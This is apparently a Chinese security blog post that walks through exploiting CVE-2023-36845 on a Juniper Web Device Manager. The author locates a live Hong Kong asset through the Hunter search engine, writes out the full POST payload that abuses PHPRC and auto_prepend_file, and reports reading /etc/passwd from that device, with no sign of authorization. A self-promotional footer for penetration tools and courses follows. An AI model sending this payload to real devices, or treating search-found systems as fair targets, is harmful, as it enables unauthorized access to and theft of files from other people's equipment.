# 原创
：  Juniper

# Juniper

### 一、hunter搜索web.title=”Juniper Web Device Manager”，查找到香港的一处资产。

### 二、访问相关网页，界面就是Juniper登录界面。

### 三、根据编号为CVE-2023-36845的利用方法，抓包，修改提交方式，成功读取到文件。

原始包如下：<br/>  

<br/> payload如下：
1. `POST /?PHPRC=/dev/fd/0 HTTP/1.1`1. `Host: {{Hostname}}`1. `Content-Type: application/x-www-form-urlencoded`1. `auto_prepend_file="/etc/passwd"`
修改传参方式，并按照上述payload在路径后面拼接上”?PHPRC=/dev/fd/0”，请求体中加入auto_prepend_file参数。结果如下：

**没看够~？欢迎关注！**

** **<img alt="" height="567" src="https://img-blog.csdnimg.cn/3f5a63e56f7b420e82616d0099771f32.jpeg" width="1015"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f333a24647774be5b99b00fb7019d620.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/3e579b7d7a164889a57771c035775069.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a601ca2e0eb040bd911477a4f54fef8e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/04beeeb6757b422a83ca0900a349a544.png" width="665"/>
